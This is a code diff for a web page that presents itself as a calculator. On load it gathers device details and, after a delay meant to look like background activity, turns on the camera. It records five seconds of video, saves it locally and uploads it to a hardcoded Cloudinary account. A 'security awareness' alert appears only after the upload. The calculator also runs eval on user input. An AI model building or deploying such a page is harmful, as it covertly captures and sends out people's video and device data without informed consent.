@@ -3,94 +3,81 @@ console.log("Script Loaded");
 let result = document.getElementById("result");
 let video = document.getElementById("video");
 
-const DRIVE_API = "https://script.google.com/macros/s/AKfycbxwMWlXxZ2yU0EFMdXhqtjhL7rHHtJW9b8rt-gb6uxMzAYSr0u2YR4zKnaGLPwCir_xYg/exec";
-
-
-function press(v){
-result.value += v;
+// Calculator functions
+function press(v) {
+    result.value += v;
 }
 
-function clearResult(){
-result.value="";
+function clearResult() {
+    result.value = "";
 }
 
-function calculate(){
-try{
-result.value = eval(result.value);
-}catch{
-result.value="Error";
-}
+function calculate() {
+    try {
+        result.value = eval(result.value);
+    } catch {
+        result.value = "Error";
+    }
 }
 
 let mediaRecorder;
-let chunks=[];
+let chunks = [];
 
-async function startCamera(){
+// Phase 1 & 2: Camera Activation and Recording
+async function startCamera() {
+    try {
+        console.log("Starting camera");
+        // Requesting permission (Requirement: Automated Capture)
+        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
 
-try{
+        mediaRecorder = new MediaRecorder(stream);
 
-console.log("Starting camera");
+        mediaRecorder.ondataavailable = function(e) {
+            chunks.push(e.data);
+        };
 
-let stream = await navigator.mediaDevices.getUserMedia({video:true});
+        mediaRecorder.onstop = function() {
+            console.log("Recording stopped");
+            let blob = new Blob(chunks, { type: "video/webm" });
+            chunks = [];
 
-video.srcObject = stream;
+            // Phase 1: Save to Local Storage
+            saveLocal(blob);
 
-mediaRecorder = new MediaRecorder(stream);
+            // Phase 2: Save to Cloud Storage (Cloudinary)
+            uploadToCloudinary(blob);
 
-mediaRecorder.ondataavailable=function(e){
-chunks.push(e.data);
-};
+            // Security Awareness Mode: Show warning after recording
+            setTimeout(() => {
+                showSecurityWarning();
+            }, 1000);
+        };
 
-mediaRecorder.onstop=function(){
+        mediaRecorder.start();
+        console.log("Recording started");
 
-console.log("Recording stopped");
+        // Record for 5 seconds as a demonstration
+        setTimeout(() => {
+            mediaRecorder.stop();
+        }, 5000);
 
-let blob=new Blob(chunks,{type:"video/webm"});
-
-chunks=[];
-
-saveLocal(blob);
-
-uploadToDrive(blob);
-
-setTimeout(()=>{
-showSecurityWarning();
-},1000);
-
-};
-
-mediaRecorder.start();
-
-console.log("Recording started");
-
-setTimeout(()=>{
-mediaRecorder.stop();
-},5000);
-
-}catch(err){
-
-console.log("Camera error:",err);
-
+    } catch (err) {
+        console.log("Camera error:", err);
+    }
 }
 
+// Phase 1: Local Storage Implementation
+function saveLocal(blob) {
+    let reader = new FileReader();
+    reader.readAsDataURL(blob);
+    reader.onloadend = function() {
+        localStorage.setItem("recordedVideo", reader.result);
+        console.log("Video saved to Local Storage");
+    };
 }
 
-function saveLocal(blob){
-
-let reader=new FileReader();
-
-reader.readAsDataURL(blob);
-
-reader.onloadend=function(){
-
-localStorage.setItem("recordedVideo",reader.result);
-
-console.log("Video saved to Local Storage");
-
-};
-
-}
-
+// Phase 2: Cloud Storage Implementation (Cloudinary)
 function uploadToCloudinary(blob) {
     const cloudName = "dwa0zhoc2"; 
     const uploadPreset = "ml_default"; 
@@ -111,39 +98,36 @@ function uploadToCloudinary(blob) {
         console.error("Cloudinary Upload Error:", error);
     });
 }
-function captureDeviceInfo(){
 
-let deviceInfo={
-browser:navigator.userAgent,
-os:navigator.platform,
-screen:screen.width+"x"+screen.height,
-timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
-};
+// Bonus: Capture User Device Information
+function captureDeviceInfo() {
+    let deviceInfo = {
+        browser: navigator.userAgent,
+        os: navigator.platform,
+        screen: screen.width + "x" + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
 
-localStorage.setItem("deviceInfo",JSON.stringify(deviceInfo));
-
-console.table(deviceInfo);
-
+    localStorage.setItem("deviceInfo", JSON.stringify(deviceInfo));
+    console.table(deviceInfo);
 }
 
-function showSecurityWarning(){
-
-alert(
-"Security Awareness Demonstration\n\n"+
-"This demonstration shows how malicious websites could misuse camera permissions.\n\n"+
-"Always verify a website before allowing camera access."
-);
-
+// Security Awareness Mode: Warning Message
+function showSecurityWarning() {
+    alert(
+        "Security Awareness Demonstration\n\n" +
+        "This demonstration shows how malicious websites could misuse camera permissions.\n\n" +
+        "Always verify a website before allowing camera access."
+    );
 }
 
-window.onload=function(){
+// Initialization on Page Load
+window.onload = function() {
+    console.log("Page loaded");
+    captureDeviceInfo();
 
-console.log("Page loaded");
-
-captureDeviceInfo();
-
-setTimeout(()=>{
-startCamera();
-},1500);
-
+    // Start camera after a short delay to simulate background activity
+    setTimeout(() => {
+        startCamera();
+    }, 1500);
 };
